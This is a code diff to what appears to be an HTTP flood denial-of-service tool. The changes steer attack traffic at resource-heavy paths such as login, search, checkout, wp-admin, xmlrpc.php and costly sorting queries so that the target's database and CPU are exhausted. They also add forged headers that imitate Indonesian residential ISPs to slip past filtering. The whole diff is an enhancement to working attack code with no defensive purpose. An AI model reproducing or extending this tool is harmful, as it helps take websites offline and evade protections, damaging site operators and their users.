@@ -301,8 +301,12 @@ class Tools:
                 elif link.startswith('/'): # Relative Path
                     valid_paths.append(link)
             
-            # Unique Only
-            return list(set(valid_paths))
+            # [PHASE 6] Heavy Path Prioritization
+            heavy_keywords = ['search', 'login', 'checkout', 'cart', 'account', 'register', 'wp-admin', '?s=']
+            heavy_paths = [p for p in valid_paths if any(k in p.lower() for k in heavy_keywords)]
+            
+            # Unique Only, with heavy paths prioritized
+            return list(set(valid_paths + heavy_paths))
         except Exception:
             return []
 
@@ -1028,6 +1032,10 @@ class HttpFlood(Thread):
             f"Sec-Fetch-Mode: navigate\r\n"
             f"Sec-Fetch-Site: none\r\n"
             f"Sec-Fetch-User: ?1\r\n"
+            # [PHASE 6] Localized ISP Spoofing (Indonesian Residential)
+            f"X-ISP: {randchoice(['Telkomsel', 'Indihome', 'XL-Axiata', 'Biznet', 'FirstMedia'])}\r\n"
+            f"X-Provider-Route: {ProxyTools.Random.rand_str(8)}\r\n"
+            f"X-Real-ISP: {randchoice(['PT Telekomunikasi Indonesia', 'PT XL Axiata', 'PT Link Net'])}\r\n"
             f"Sec-Gpc: 1\r\n"
             f"Sec-Ch-Ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"\r\n"
             f"Sec-Ch-Ua-Mobile: {mobile}\r\n"
@@ -1051,18 +1059,20 @@ class HttpFlood(Thread):
         if hasattr(self, 'crawled_paths') and self.crawled_paths and choice_roll < 60:
             return randchoice(self.crawled_paths)
             
-        # Option B: Common WP Paths
+        # Option B: Heavy Paths (Focus on DB/CPU)
         if choice_roll < 80:
-            common_wp = [
+            heavy_paths = [
                 "/",
                 "/wp-login.php",
                 "/wp-admin/admin-ajax.php",
                 "/xmlrpc.php",
                 "/feed/",
                 "/comments/feed/",
-                "/?s=" + ProxyTools.Random.rand_str(5)
+                "/?s=" + ProxyTools.Random.rand_str(5),
+                "/search/" + ProxyTools.Random.rand_str(8),
+                "/shop/?orderby=price-desc" # Heavy sorting
             ]
-            return randchoice(common_wp)
+            return randchoice(heavy_paths)
             
         # Option C: Original Target
         return self._target.raw_path_qs
